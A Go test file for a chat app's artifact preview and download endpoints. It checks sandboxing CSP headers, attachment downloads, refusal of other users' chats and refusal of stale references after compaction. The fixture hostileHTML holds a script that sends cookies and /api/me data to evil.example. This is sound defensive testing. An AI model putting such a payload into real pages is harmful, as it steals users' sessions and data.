package chat

import (
	"encoding/json"
	"os"
	"reflect"
	"strings"
	"testing"

	"github.com/raufimusaddiq/antares/internal/store"
)

const hostileHTML = `<script>fetch("/api/me").then(r=>r.text()).then(t=>top.location="https://evil.example/?"+document.cookie+t)</script><p>hi</p>`

func seedArtifacts(t *testing.T, a *app, p *person, chatID string) {
	t.Helper()
	a.hx.mu.Lock()
	a.hx.msgs[decodeSession(t, a, p, chatID)] = []map[string]any{
		{"role": "user", "content": "```html\n<b>user fences are not artifacts</b>\n```"},
		{"role": "assistant", "content": "Here:\n```html\n" + hostileHTML + "\n```\n```go\nfunc main(){}\n```\n```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"4\"/></svg>\n```\n```html\n<p>unterminated"},
	}
	a.hx.mu.Unlock()
}

// turnRef is the ref the history API stamps on turn seq.
func turnRef(t *testing.T, p *person, chatID string, seq int) string {
	t.Helper()
	for _, m := range decodeBody[historyPage](t, p.get("/api/chats/"+chatID+"/messages")).Messages {
		if m.Seq == seq {
			return m.Ref
		}
	}
	t.Fatalf("no turn %d", seq)
	return ""
}

// The same table is run by web/src/Artifacts.test.tsx: the two parsers must name the same
// artifacts for every input, Unicode whitespace included.
func TestFindArtifactsSharedTable(t *testing.T) {
	raw, err := os.ReadFile("testdata/artifact_cases.json")
	if err != nil {
		t.Fatal(err)
	}
	var cases []struct {
		Name, Text string
		Repeat     []struct {
			Text  string
			Times int
		}
		Want []string
	}
	if err := json.Unmarshal(raw, &cases); err != nil {
		t.Fatal(err)
	}
	for _, c := range cases {
		t.Run(c.Name, func(t *testing.T) {
			text := c.Text
			for _, r := range c.Repeat { // big inputs are written as pieces to keep the table small
				text += strings.Repeat(r.Text, r.Times)
			}
			got := []string{}
			for _, a := range findArtifacts(text) {
				got = append(got, a.kind)
			}
			if !reflect.DeepEqual(got, append([]string{}, c.Want...)) {
				t.Fatalf("got %v want %v", got, c.Want)
			}
		})
	}
}

func TestFindArtifactsOnlyClosedHTMLAndSVGFences(t *testing.T) {
	got := findArtifacts("```html\n<p>a</p>\n```\n```py\nx\n```\n````svg\n<svg/>\n```\n````\n```html\nopen")
	if len(got) != 2 || got[0].kind != "html" || got[0].body != "<p>a</p>" || got[1].kind != "svg" || got[1].body != "<svg/>\n```" {
		t.Fatalf("got %+v", got)
	}
}

func TestArtifactPreviewIsSandboxedAndDownloadIsAnAttachment(t *testing.T) {
	a := newApp(t)
	u := a.user("alice")
	chat := u.newChat()
	seedArtifacts(t, a, u, chat)
	q := "?ref=" + turnRef(t, u, chat, 1)
	base := "/api/chats/" + chat + "/messages/1/artifacts/"

	w := u.get(base + "0/preview" + q)
	if w.Code != 200 || w.Body.String() != hostileHTML {
		t.Fatalf("preview: %d %q", w.Code, w.Body.String())
	}
	csp := w.Header().Get("Content-Security-Policy")
	for _, want := range []string{"sandbox;", "default-src 'none'", "frame-ancestors 'self'"} {
		if !strings.Contains(csp, want) {
			t.Errorf("preview CSP %q lacks %q", csp, want)
		}
	}
	if strings.Contains(csp, "allow-") || strings.Contains(csp, "script-src") {
		t.Errorf("preview CSP grants something: %q", csp)
	}
	if w.Header().Get("X-Content-Type-Options") != "nosniff" || !strings.HasPrefix(w.Header().Get("Content-Type"), "text/html") {
		t.Errorf("preview headers: %v", w.Header())
	}
	if ct := u.get(base + "1/preview" + q).Header().Get("Content-Type"); !strings.HasPrefix(ct, "image/svg+xml") {
		t.Errorf("svg preview type %q", ct)
	}

	w = u.get(base + "1" + q)
	if w.Code != 200 || !strings.HasPrefix(w.Header().Get("Content-Disposition"), "attachment; filename=\"antares-turn1-artifact2.svg\"") ||
		w.Header().Get("Content-Type") != "application/octet-stream" || w.Header().Get("Content-Security-Policy") != "sandbox" {
		t.Errorf("download: %d %v", w.Code, w.Header())
	}
}

func TestArtifactRefusals(t *testing.T) {
	a := newApp(t)
	alice, bob := a.user("alice"), a.user("bobby")
	chat := alice.newChat()
	seedArtifacts(t, a, alice, chat)
	q := "?ref=" + turnRef(t, alice, chat, 1)
	for _, suffix := range []string{"", "/preview"} {
		ok := "/api/chats/" + chat + "/messages/1/artifacts/0" + suffix + q
		if w := alice.get(ok); w.Code != 200 {
			t.Fatalf("owner %s: %d", ok, w.Code)
		}
		// Another user's reference is refused, identically to one that never existed.
		got := bob.get(ok)
		absent := bob.get("/api/chats/" + store.NewID() + "/messages/1/artifacts/0" + suffix + q)
		if got.Code != 404 || strings.Contains(got.Body.String(), "fetch(") || !sameAnswer(got, absent) {
			t.Errorf("foreign %s: %d %s (absent: %d %s)", ok, got.Code, got.Body.String(), absent.Code, absent.Body.String())
		}
		// Things that are not artifacts: a user turn, a non-html fence, an unterminated fence, junk indexes.
		for _, p := range []string{"/messages/0/artifacts/0", "/messages/1/artifacts/2", "/messages/1/artifacts/3", "/messages/9/artifacts/0", "/messages/1/artifacts/-1", "/messages/x/artifacts/0"} {
			if w := alice.get("/api/chats/" + chat + p + suffix + q); w.Code != 404 {
				t.Errorf("%s%s: %d, want 404", p, suffix, w.Code)
			}
		}
	}
}

// Compaction shifts positions. A seq quoted with the ref of the turn that used to be there
// must not resolve to whatever turn sits there now; a missing or wrong ref is a 404 too.
func TestArtifactStaleSeqIsRefusedAfterCompaction(t *testing.T) {
	a := newApp(t)
	u := a.user("alice")
	chat := u.newChat()
	seedArtifacts(t, a, u, chat)
	path := "/api/chats/" + chat + "/messages/1/artifacts/0"
	stale := "?ref=" + turnRef(t, u, chat, 1)
	if w := u.get(path + stale); w.Code != 200 {
		t.Fatalf("before compaction: %d", w.Code)
	}
	a.hx.mu.Lock() // an older turn is compacted in: seq 1 is now a different assistant turn
	sid := decodeSession(t, a, u, chat)
	a.hx.msgs[sid] = append([]map[string]any{
		{"role": "user", "content": "q"}, {"role": "assistant", "content": "```html\n<p>other turn</p>\n```"},
	}, a.hx.msgs[sid]...)
	a.hx.mu.Unlock()
	if w := u.get(path + stale); w.Code != 404 || strings.Contains(w.Body.String(), "other turn") {
		t.Fatalf("stale ref resolved: %d %s", w.Code, w.Body.String())
	}
	for _, q := range []string{"", "?ref=", "?ref=0000000000000000"} {
		if w := u.get(path + q); w.Code != 404 {
			t.Errorf("ref %q: %d, want 404", q, w.Code)
		}
	}
	if w := u.get(path + "?ref=" + turnRef(t, u, chat, 1)); w.Code != 200 || !strings.Contains(w.Body.String(), "other turn") {
		t.Fatalf("fresh ref: %d %s", w.Code, w.Body.String())
	}
}
